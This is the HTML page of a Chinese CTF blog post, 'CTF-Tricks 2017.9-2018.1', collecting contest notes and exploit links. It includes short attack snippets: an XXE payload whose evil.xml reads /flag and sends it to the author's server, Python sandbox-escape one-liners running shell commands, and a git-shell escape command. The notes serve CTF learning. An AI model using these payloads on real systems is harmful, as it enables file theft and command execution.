@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        CTF-Tricks 2017.9-2018.1 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%93%9D%E7%9B%BE%E6%9D%AF"><span class="toc-text">蓝盾杯</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-text">mysql修改密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E5%BC%80%E5%90%AF-x2F-%E5%85%B3%E9%97%AD%E5%A4%96%E9%93%BE"><span class="toc-text">mysql开启&#x2F;关闭外链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9ftp%E5%AF%86%E7%A0%81"><span class="toc-text">修改ftp密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#others"><span class="toc-text">others</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WHCTF"><span class="toc-text">WHCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xdebug%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">xdebug命令执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%81%E4%B8%89%E6%80%BB%E5%86%B3%E8%B5%9B"><span class="toc-text">铁三总决赛</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wordpress"><span class="toc-text">wordpress</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#seacms"><span class="toc-text">seacms</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#drupal"><span class="toc-text">drupal</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XDCTF"><span class="toc-text">XDCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E5%BD%A2ip%E7%BB%95%E8%BF%87ssrf%E6%A3%80%E6%B5%8B"><span class="toc-text">整形ip绕过ssrf检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="toc-text">python沙盒逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-x2F-x2F-filter-base64-decode%E5%AE%B9%E9%94%99%E6%80%A7"><span class="toc-text">php:&#x2F;&#x2F;filter + base64_decode容错性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%95%E6%B5%8B%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B"><span class="toc-text">幕测秋季预选赛</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#N%E5%9C%A8MySQL%E4%B8%AD%E8%A1%A8%E7%A4%BANULL"><span class="toc-text">\N在MySQL中表示NULL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#perl%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">perl命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpjm"><span class="toc-text">phpjm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#others-1"><span class="toc-text">others</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E7%A7%91%E5%A4%A7%E4%BF%A1%E5%AE%89%E8%B5%9B"><span class="toc-text">中科大信安赛</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#kail-pdftotest"><span class="toc-text">kail pdftotest</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wireshark%E5%AF%BC%E5%85%A5%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-text">wireshark导入二进制数据包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jemdoc"><span class="toc-text">jemdoc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#js%E8%B0%83%E8%AF%95"><span class="toc-text">js调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pickle-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">pickle 代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hexpand"><span class="toc-text">hexpand</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GIT-SHELL%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87"><span class="toc-text">GIT-SHELL沙盒绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A5%BF%E5%8D%97%E7%9F%B3%E6%B2%B9%E5%A4%A7%E5%AD%A6ctf"><span class="toc-text">西南石油大学ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-screw"><span class="toc-text">php_screw</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xxe"><span class="toc-text">xxe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8-1"><span class="toc-text">python沙盒逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#platform"><span class="toc-text">platform</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#timeit"><span class="toc-text">timeit</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thinkphp-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">Thinkphp 模板注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF"><span class="toc-text">HCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#js%E8%B0%83%E8%AF%95-1"><span class="toc-text">js调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql-out-of-band"><span class="toc-text">Mysql out-of-band</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E7%94%A8%E6%88%B7%E5%8F%98%E9%87%8F%E7%BB%95waf"><span class="toc-text">mysql用户变量绕waf</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LCTF"><span class="toc-text">LCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#padding-oracle-attack"><span class="toc-text">padding oracle attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">格式化字符串导致注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#preg-match%E5%8C%B9%E9%85%8D%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E5%AF%BC%E8%87%B4%E8%B6%85%E6%97%B6"><span class="toc-text">preg_match匹配超长字符导致超时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E5%AD%97%E7%AC%A6getshell"><span class="toc-text">7字符getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssrf%E7%BB%95%E8%BF%87"><span class="toc-text">ssrf绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UXSS"><span class="toc-text">UXSS</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        CTF-Tricks 2017.9-2018.1
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-02-14 20:45:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p>两个多月没更新之后，除夕夜的前一天，失踪人口回归了~~~<br>这两个多月感觉瞎忙活了不少，又好像没学到啥东西，今天更篇博客，总结一下这半年打ctf积累的姿势，算是给这一年画上一个不太完美的句号吧。（留下的坑年后慢慢填吧：p）</p>
+<span id="more"></span>
+
+<h3 id="蓝盾杯"><a href="#蓝盾杯" class="headerlink" title="蓝盾杯"></a>蓝盾杯</h3><p>2017.9.17</p>
+<h4 id="mysql修改密码"><a href="#mysql修改密码" class="headerlink" title="mysql修改密码"></a>mysql修改密码</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> password<span class="operator">=</span>PASSWORD(<span class="string">&#x27;!@#$%&#x27;</span>) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<h4 id="mysql开启-x2F-关闭外链"><a href="#mysql开启-x2F-关闭外链" class="headerlink" title="mysql开启&#x2F;关闭外链"></a>mysql开启&#x2F;关闭外链</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> host<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> host<span class="operator">=</span><span class="string">&#x27;%&#x27;</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<h4 id="修改ftp密码"><a href="#修改ftp密码" class="headerlink" title="修改ftp密码"></a>修改ftp密码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd ftp_user</span><br></pre></td></tr></table></figure>
+
+<h4 id="others"><a href="#others" class="headerlink" title="others"></a>others</h4><p>proftpd 跨目录读取文件</p>
+<h3 id="WHCTF"><a href="#WHCTF" class="headerlink" title="WHCTF"></a>WHCTF</h3><h4 id="xdebug命令执行"><a href="#xdebug命令执行" class="headerlink" title="xdebug命令执行"></a>xdebug命令执行</h4><p><a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a></p>
+<h3 id="铁三总决赛"><a href="#铁三总决赛" class="headerlink" title="铁三总决赛"></a>铁三总决赛</h3><p>2017.9.23</p>
+<h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><ol>
+<li>wp-hide-security-enhancer任意文件读取</li>
+</ol>
+<p>利用：<a target="_blank" rel="noopener" href="https://secupress.me/blog/arbitrary-file-download-vulnerability-in-wp-hide-security-enhancer-1-3-9-2/">https://secupress.me/blog/arbitrary-file-download-vulnerability-in-wp-hide-security-enhancer-1-3-9-2/</a></p>
+<ol start="2">
+<li>phpmailer-rce</li>
+</ol>
+<p>复现+利用：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/wordpress/phpmailer-rce">https://github.com/vulhub/vulhub/tree/master/wordpress/phpmailer-rce</a></p>
+<h4 id="seacms"><a href="#seacms" class="headerlink" title="seacms"></a>seacms</h4><p>v6.28 代码执行</p>
+<p>利用：<a target="_blank" rel="noopener" href="http://0day5.com/archives/4180/">http://0day5.com/archives/4180/</a></p>
+<p>扩展：v6.45 getshell</p>
+<p>利用：<a target="_blank" rel="noopener" href="http://0day5.com/archives/4249/">http://0day5.com/archives/4249/</a></p>
+<p>再次扩展：v6.54 getshell</p>
+<p>利用：<a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/150042.html">http://www.freebuf.com/vuls/150042.html</a></p>
+<h4 id="drupal"><a href="#drupal" class="headerlink" title="drupal"></a>drupal</h4><p>Drupal PECL YAML parser 远程代码执行漏洞(CVE-2017-6920)</p>
+<p>复现：<a target="_blank" rel="noopener" href="https://github.com/Medicean/VulApps/tree/master/d/drupal/1">https://github.com/Medicean/VulApps/tree/master/d/drupal/1</a></p>
+<p>利用：<a target="_blank" rel="noopener" href="https://paper.seebug.org/334/">https://paper.seebug.org/334/</a> + <a target="_blank" rel="noopener" href="http://www.bendawang.site/2017/07/19/pwnhub-%E7%B2%97%E5%BF%83%E7%9A%84%E4%BD%B3%E4%BD%B3/">http://www.bendawang.site/2017/07/19/pwnhub-%E7%B2%97%E5%BF%83%E7%9A%84%E4%BD%B3%E4%BD%B3/</a></p>
+<h3 id="XDCTF"><a href="#XDCTF" class="headerlink" title="XDCTF"></a>XDCTF</h3><p>2017.10.1-2017.10.2</p>
+<h4 id="整形ip绕过ssrf检测"><a href="#整形ip绕过ssrf检测" class="headerlink" title="整形ip绕过ssrf检测"></a>整形ip绕过ssrf检测</h4><p>读取<code>/etc/hosts</code>、<code>/proc/net/arp</code>获取主机内网信息</p>
+<h4 id="python沙盒逃逸"><a href="#python沙盒逃逸" class="headerlink" title="python沙盒逃逸"></a>python沙盒逃逸</h4><p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/2138.html">https://xianzhi.aliyun.com/forum/read/2138.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/4503.html">http://bobao.360.cn/learning/detail/4503.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://docs.ioin.in/writeup/github.com/_neargle_PIL_RCE_By_GhostButt/index.html">http://docs.ioin.in/writeup/github.com/_neargle_PIL_RCE_By_GhostButt&#x2F;index.html</a></p>
+<h4 id="php-x2F-x2F-filter-base64-decode容错性"><a href="#php-x2F-x2F-filter-base64-decode容错性" class="headerlink" title="php:&#x2F;&#x2F;filter + base64_decode容错性"></a>php:&#x2F;&#x2F;filter + base64_decode容错性</h4><p>机器学习</p>
+<h3 id="幕测秋季预选赛"><a href="#幕测秋季预选赛" class="headerlink" title="幕测秋季预选赛"></a>幕测秋季预选赛</h3><p>2017.10.15</p>
+<h4 id="N在MySQL中表示NULL"><a href="#N在MySQL中表示NULL" class="headerlink" title="\N在MySQL中表示NULL"></a><code>\N</code>在MySQL中表示<code>NULL</code></h4><p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/null-values.html">https://dev.mysql.com/doc/refman/5.7/en/null-values.html</a></p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171016/i0aGg6E0Ik.png" alt="mark"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from error_news where id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="variable">$var</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/([^a-z]+)(union|from)/i&#x27;</span>, <span class="string">&#x27;&amp;#160;$2&#x27;</span>, <span class="variable">$var</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="perl命令执行"><a href="#perl命令执行" class="headerlink" title="perl命令执行"></a>perl命令执行</h4><p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6241">http://www.vuln.cn/6241</a></p>
+<p>执行命令时可以进行编码来绕过过滤</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo | base64 -D</span><br></pre></td></tr></table></figure>
+
+<h4 id="phpjm"><a href="#phpjm" class="headerlink" title="phpjm"></a>phpjm</h4><p>对于使用phpjm混淆过的文件可以先包含然后输出全局变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;xml.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$GLOBALS</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="others-1"><a href="#others-1" class="headerlink" title="others"></a>others</h4><p>xxe可以使用php伪协议</p>
+<h3 id="中科大信安赛"><a href="#中科大信安赛" class="headerlink" title="中科大信安赛"></a>中科大信安赛</h3><h4 id="kail-pdftotest"><a href="#kail-pdftotest" class="headerlink" title="kail pdftotest"></a>kail pdftotest</h4><h4 id="wireshark导入二进制数据包"><a href="#wireshark导入二进制数据包" class="headerlink" title="wireshark导入二进制数据包"></a>wireshark导入二进制数据包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od -Ax -tx1 [binaryfile]</span><br></pre></td></tr></table></figure>
+
+<p>转为16进制再用wireshark导入</p>
+<h4 id="jemdoc"><a href="#jemdoc" class="headerlink" title="jemdoc"></a>jemdoc</h4><p><a target="_blank" rel="noopener" href="http://jemdoc.jaboc.net/">http://jemdoc.jaboc.net/</a></p>
+<p>访问index.jemdoc</p>
+<h4 id="js调试"><a href="#js调试" class="headerlink" title="js调试"></a>js调试</h4><p>题目是一个注入，用ajax请求后端，使用js做了一个签名，但是js代码做了混淆。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171022/712GEh656h.png" alt="mark"></p>
+<p>需要调试js来获取他的加密算法。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171022/hCFGmBK362.png" alt="mark"></p>
+<p>虽然代码做了混淆，但还是找到了关键字，我们需要知道t、c、r的值。所以在此处下断点，单步调试，最后可以得到他们的值。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171022/iEEg328jak.png" alt="mark"></p>
+<p>接下来只要把payload后面加上签名就可以了，常规注入。</p>
+<h4 id="pickle-代码执行"><a href="#pickle-代码执行" class="headerlink" title="pickle 代码执行"></a>pickle 代码执行</h4><p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/system/89165.html">http://www.freebuf.com/articles/system/89165.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://volltin.gitbooks.io/hackergame2017-writeup/hide-and-seek.html">https://volltin.gitbooks.io/hackergame2017-writeup/hide-and-seek.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.polaris-lab.com/index.php/archives/178/">http://www.polaris-lab.com/index.php/archives/178/</a></p>
+<h4 id="hexpand"><a href="#hexpand" class="headerlink" title="hexpand"></a>hexpand</h4><h4 id="GIT-SHELL沙盒绕过"><a href="#GIT-SHELL沙盒绕过" class="headerlink" title="GIT-SHELL沙盒绕过"></a>GIT-SHELL沙盒绕过</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html">https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p port -i id_rsa -t git@host &quot;git-upload-archive &#x27;--help&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>-t 是必须的，否则会直接返回一段文本，不会打开交互式界面</strong></p>
+<p><code>shift + e</code>读取任意文件或者<code>!command</code>执行命令。</p>
+<h3 id="西南石油大学ctf"><a href="#西南石油大学ctf" class="headerlink" title="西南石油大学ctf"></a>西南石油大学ctf</h3><h4 id="php-screw"><a href="#php-screw" class="headerlink" title="php_screw"></a>php_screw</h4><p><a target="_blank" rel="noopener" href="http://wutongyu.info/about-php-screw-decode/">http://wutongyu.info/about-php-screw-decode/</a></p>
+<h4 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h4><p>修改<code>Content-Type</code>为<code>text/xml</code>，注意修改<code>Content-Length</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root SYSTEM &quot;http://seaii-blog.com:8000/evil.xml&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>evil.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://seaii-blog.com:8000/index.php?aaaaa=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%payload;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+
+<h4 id="python沙盒逃逸-1"><a href="#python沙盒逃逸-1" class="headerlink" title="python沙盒逃逸"></a>python沙盒逃逸</h4><h5 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.popen(<span class="string">&#x27;id&#x27;</span>, mode=<span class="string">&#x27;r&#x27;</span>, bufsize=-<span class="number">1</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h5 id="timeit"><a href="#timeit" class="headerlink" title="timeit"></a>timeit</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;&#x27;)&quot;</span>, number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://icematcha.win/?p=725">http://icematcha.win/?p=725</a></p>
+<p><a target="_blank" rel="noopener" href="http://icematcha.win/?p=532">Time Based RCE</a> </p>
+<h4 id="Thinkphp-模板注入"><a href="#Thinkphp-模板注入" class="headerlink" title="Thinkphp 模板注入"></a>Thinkphp 模板注入</h4><h3 id="HCTF"><a href="#HCTF" class="headerlink" title="HCTF"></a>HCTF</h3><h4 id="js调试-1"><a href="#js调试-1" class="headerlink" title="js调试"></a>js调试</h4><p><a target="_blank" rel="noopener" href="http://www.jianshu.com/p/9148d215c119">http://www.jianshu.com/p/9148d215c119</a></p>
+<h4 id="Mysql-out-of-band"><a href="#Mysql-out-of-band" class="headerlink" title="Mysql out-of-band"></a>Mysql out-of-band</h4><p><a target="_blank" rel="noopener" href="http://www.mottoin.com/96463.html">http://www.mottoin.com/96463.html</a></p>
+<h4 id="mysql用户变量绕waf"><a href="#mysql用户变量绕waf" class="headerlink" title="mysql用户变量绕waf"></a>mysql用户变量绕waf</h4><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///180213/5GKAfklJDL.png" alt="mark"></p>
+<p>@var是mysql中的用户变量，<code>:=</code>是在select中赋值的操作符。可利用的场景比较少</p>
+<h3 id="LCTF"><a href="#LCTF" class="headerlink" title="LCTF"></a>LCTF</h3><h4 id="padding-oracle-attack"><a href="#padding-oracle-attack" class="headerlink" title="padding oracle attack"></a>padding oracle attack</h4><h4 id="格式化字符串导致注入"><a href="#格式化字符串导致注入" class="headerlink" title="格式化字符串导致注入"></a>格式化字符串导致注入</h4><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/386/">https://paper.seebug.org/386/</a></p>
+<h4 id="preg-match匹配超长字符导致超时"><a href="#preg-match匹配超长字符导致超时" class="headerlink" title="preg_match匹配超长字符导致超时"></a>preg_match匹配超长字符导致超时</h4><h4 id="7字符getshell"><a href="#7字符getshell" class="headerlink" title="7字符getshell"></a>7字符getshell</h4><p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6016">http://www.vuln.cn/6016</a></p>
+<h4 id="ssrf绕过"><a href="#ssrf绕过" class="headerlink" title="ssrf绕过"></a>ssrf绕过</h4><p><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/4183.html">http://bobao.360.cn/learning/detail/4183.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/65832.html">https://www.secpulse.com/archives/65832.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p>
+<p>curl是支持file:&#x2F;&#x2F;host&#x2F;path, file:&#x2F;&#x2F;path这两种形式, 但是<strong>即使有host, curl仍然会访问到本地的文件</strong></p>
+<h4 id="UXSS"><a href="#UXSS" class="headerlink" title="UXSS"></a>UXSS</h4><p><a target="_blank" rel="noopener" href="http://www.fooying.com/uxss/">http://www.fooying.com/uxss/</a></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
